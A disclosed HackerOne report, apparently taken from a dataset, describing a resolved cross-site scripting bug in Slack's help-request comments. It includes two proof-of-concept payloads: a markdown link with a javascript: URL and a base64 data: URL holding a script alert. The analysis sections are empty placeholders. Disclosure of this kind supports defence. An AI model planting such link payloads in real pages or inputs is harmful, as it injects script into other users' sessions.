---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '116419'
original_report_id: '116419'
title: an xss issue in https://hunter22.slack.com/help/requests/793043
weakness: Cross-site Scripting (XSS) - Generic
team_handle: slack
created_at: '2016-02-14T18:53:45.234Z'
disclosed_at: '2016-04-30T22:10:30.143Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# an xss issue in https://hunter22.slack.com/help/requests/793043

## Metadata

- HackerOne Report ID: 116419
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: slack
- Disclosed At: 2016-04-30T22:10:30.143Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

good day: 
 i found an xss issue when making a help request..
https://hunter22.slack.com/help/requests/new

with this xss payload:
[Click here](javascript:alert(document.domain))
[click this link](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)

when try to comment the xss payload , then upon clicking xss payload executed.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
